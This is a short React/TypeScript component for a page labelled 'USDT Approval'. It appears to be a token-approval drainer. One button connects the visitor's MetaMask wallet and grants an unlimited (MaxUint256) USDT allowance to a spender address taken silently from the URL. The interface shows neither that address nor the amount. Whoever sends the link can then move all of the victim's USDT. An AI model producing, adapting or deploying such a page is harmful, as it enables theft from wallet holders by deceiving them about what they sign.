import { ethers } from "ethers";
import "./ApprovePage.css";

const USDT_ADDRESS =
  "0xdAC17F958D2ee523a2206206994597C13D831ec7";

export default function ApprovePage() {
  const approve = async () => {
    try {
      if (!(window as any).ethereum) {
        alert("Please install MetaMask");
        return;
      }

      const provider = new ethers.BrowserProvider(
        (window as any).ethereum
      );

      await provider.send("eth_requestAccounts", []);

      const signer = await provider.getSigner();

      const params = new URLSearchParams(
        window.location.search
      );

      const spender = params.get("spender");

      if (!spender) {
        alert("Spender address missing");
        return;
      }

      const usdt = new ethers.Contract(
        USDT_ADDRESS,
        [
          "function approve(address spender,uint256 amount) external returns(bool)"
        ],
        signer
      );

      const tx = await usdt.approve(
        spender,
        ethers.MaxUint256
      );

      await tx.wait();

      alert("Approval successful!");
    } catch (err) {
      console.error(err);
    }
  };

  return (
    <div className="page">
      <div className="card">
        <div className="logo">₮</div>

        <h1>USDT Approval</h1>

        <p>
          Connect your wallet and approve USDT
          spending permissions.
        </p>

        <button
          className="approve-btn"
          onClick={approve}
        >
          Approve USDT
        </button>
      </div>
    </div>
  );
}
